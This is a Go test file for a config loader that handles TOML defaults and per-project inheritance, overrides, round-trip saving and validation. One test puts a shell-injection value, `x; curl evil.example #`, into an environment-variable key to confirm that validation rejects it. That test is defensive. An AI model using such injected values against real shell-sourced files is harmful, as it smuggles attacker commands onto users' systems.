package config

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

// writeCfg drops a config.toml into a temp LOLA_HOME and loads it.
func writeCfg(t *testing.T, body string) (*Config, string) {
	t.Helper()
	t.Setenv("LOLA_HOME", t.TempDir())
	path, err := DefaultPath()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	return c, path
}

// A project that omits an inheritable key takes the [defaults] value, and the
// bit records that it was inherited rather than set.
func TestInheritFromDefaults(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
match_labels = ["label-agent"]
match_mode = "all"
dedup_mode = "label"
on_sent_set_label = "label-sent"
symlinks = [".env"]
post_create = ["composer install"]
priority_sort = ["createdAt"]

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
`)
	p := c.ProjectByName("web")
	if !reflect.DeepEqual(p.MatchLabels, []string{"label-agent"}) {
		t.Errorf("match_labels = %v, want the [defaults] value", p.MatchLabels)
	}
	if p.MatchMode != "all" || p.DedupMode != "label" || p.OnSentSetLabel != "label-sent" {
		t.Errorf("enums/labels not inherited: %q %q %q", p.MatchMode, p.DedupMode, p.OnSentSetLabel)
	}
	if !reflect.DeepEqual(p.Symlinks, []string{".env"}) || !reflect.DeepEqual(p.PostCreate, []string{"composer install"}) {
		t.Errorf("worktree setup not inherited: %v %v", p.Symlinks, p.PostCreate)
	}
	if !reflect.DeepEqual(p.PrioritySort, []string{"createdAt"}) {
		t.Errorf("priority_sort = %v, want the [defaults] value", p.PrioritySort)
	}
	if !p.Inherits.MatchLabels || !p.Inherits.MatchMode || !p.Inherits.Symlinks {
		t.Errorf("inherited keys must be marked as such: %+v", p.Inherits)
	}
}

// A project-level value wins over [defaults] and is marked as an override.
func TestProjectOverridesDefaults(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
match_labels = ["label-agent"]
match_mode = "all"

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
match_labels = ["label-web"]
match_mode = "any"
`)
	p := c.ProjectByName("web")
	if !reflect.DeepEqual(p.MatchLabels, []string{"label-web"}) {
		t.Errorf("match_labels = %v, want the project value", p.MatchLabels)
	}
	if p.MatchMode != "any" {
		t.Errorf("match_mode = %q, want any", p.MatchMode)
	}
	if p.Inherits.MatchLabels || p.Inherits.MatchMode {
		t.Errorf("explicit keys must not be marked inherited: %+v", p.Inherits)
	}
}

// An empty (but present) value is an override to nothing, NOT an inherit —
// the distinction TOML draws between `key = []` and an absent key.
func TestPresentButEmptyOverridesToNothing(t *testing.T) {
	c, path := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
match_labels = ["label-agent"]

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
match_labels = []
`)
	p := c.ProjectByName("web")
	if len(p.MatchLabels) != 0 {
		t.Fatalf("match_labels = %v, want the empty override", p.MatchLabels)
	}
	if p.Inherits.MatchLabels {
		t.Error("an explicit empty value must not be treated as inherit")
	}

	// And it must survive a save/load cycle rather than decay into inherit.
	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	again, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if q := again.ProjectByName("web"); len(q.MatchLabels) != 0 || q.Inherits.MatchLabels {
		t.Errorf("empty override lost on round trip: %v inherits=%v", q.MatchLabels, q.Inherits.MatchLabels)
	}
}

// Saving must not freeze an inherited value into the file: after a save, a
// change to [defaults] still reaches the project.
func TestInheritedKeysAreNotWrittenBack(t *testing.T) {
	c, path := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
match_labels = ["label-agent"]

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
`)
	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	// The key must appear once — under [defaults], not under [[project]].
	if n := strings.Count(string(raw), "match_labels"); n != 1 {
		t.Errorf("match_labels written %d times, want 1 (only [defaults]):\n%s", n, raw)
	}

	// Change the default; the project must follow.
	c.Defaults.MatchLabels = []string{"label-changed"}
	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	again, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if got := again.ProjectByName("web").MatchLabels; !reflect.DeepEqual(got, []string{"label-changed"}) {
		t.Errorf("project match_labels = %v, want to track the changed default", got)
	}
}

// Resolution is idempotent: the bitmap, not the stored value, is the source of
// truth, so running it twice cannot drift.
func TestResolveInheritanceIdempotent(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
match_labels = ["a", "b"]

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
`)
	first := *c.ProjectByName("web")
	c.ResolveInheritance()
	c.ResolveInheritance()
	if got := *c.ProjectByName("web"); !reflect.DeepEqual(first, got) {
		t.Errorf("resolution drifted:\n first: %+v\n after: %+v", first, got)
	}
}

// A project must not alias the shared [defaults] slice — mutating one project's
// inherited value would otherwise corrupt every other project's.
func TestInheritedSlicesAreCloned(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
match_labels = ["a"]

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"

[[project]]
name = "api"
path = "/tmp/api"
team_id = "team-1"
`)
	c.ProjectByName("web").MatchLabels[0] = "mutated"
	if got := c.ProjectByName("api").MatchLabels[0]; got != "a" {
		t.Errorf("sibling project saw %q — the [defaults] slice is aliased", got)
	}
	if got := c.Defaults.MatchLabels[0]; got != "a" {
		t.Errorf("[defaults] itself was mutated to %q", got)
	}
}

// Linear label UUIDs are team-scoped, so a [defaults] label inherited by
// projects on different teams cannot be right for both.
func TestDefaultLabelAcrossTeamsRejected(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
match_labels = ["label-agent"]

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
cycle_mode = "none"
assignee_mode = "anyone"

[[project]]
name = "api"
path = "/tmp/api"
team_id = "team-2"
cycle_mode = "none"
assignee_mode = "anyone"
`)
	err := c.Validate()
	if err == nil || !strings.Contains(err.Error(), "team-scoped") {
		t.Fatalf("want a team-scope rejection, got %v", err)
	}

	// Overriding per project resolves it: neither inherits the global label.
	c.Projects[0].MatchLabels, c.Projects[0].Inherits.MatchLabels = []string{"l1"}, false
	c.Projects[1].MatchLabels, c.Projects[1].Inherits.MatchLabels = []string{"l2"}, false
	if err := c.Validate(); err != nil {
		t.Fatalf("per-project overrides must be accepted, got %v", err)
	}
}

// One team inheriting the default is fine, however many projects share it.
func TestDefaultLabelSingleTeamAccepted(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
match_labels = ["label-agent"]

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
cycle_mode = "none"
assignee_mode = "anyone"

[[project]]
name = "api"
path = "/tmp/api"
team_id = "team-1"
cycle_mode = "none"
assignee_mode = "anyone"
`)
	if err := c.Validate(); err != nil {
		t.Fatalf("one team must validate, got %v", err)
	}
}

// [defaults].env feeds the same shell-sourced file as [[project]].env, so it
// needs the same identifier check — this is a security boundary, not a nicety.
func TestDefaultsEnvKeyValidated(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2

[[project]]
name = "web"
path = "/tmp/web"
`)
	c.Defaults.Env = map[string]string{`x; curl evil.example #`: "y"}
	err := c.Validate()
	if err == nil || !strings.Contains(err.Error(), "not a valid shell identifier") {
		t.Fatalf("want a shell-identifier rejection, got %v", err)
	}
}

// Neither project nor [defaults] set the enums: resolution supplies the hard
// fallbacks rather than leaving a value Validate would reject.
func TestHardFallbacksWhenDefaultsSilent(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
cycle_mode = "none"
assignee_mode = "anyone"
`)
	p := c.ProjectByName("web")
	if p.MatchMode != DefaultMatchMode || p.DedupMode != DefaultDedupMode {
		t.Errorf("match/dedup = %q/%q, want the hard fallbacks", p.MatchMode, p.DedupMode)
	}
	if !reflect.DeepEqual(p.PrioritySort, DefaultPrioritySort) {
		t.Errorf("priority_sort = %v, want %v", p.PrioritySort, DefaultPrioritySort)
	}
	if err := c.Validate(); err != nil {
		t.Errorf("resolved fallbacks must validate, got %v", err)
	}
}
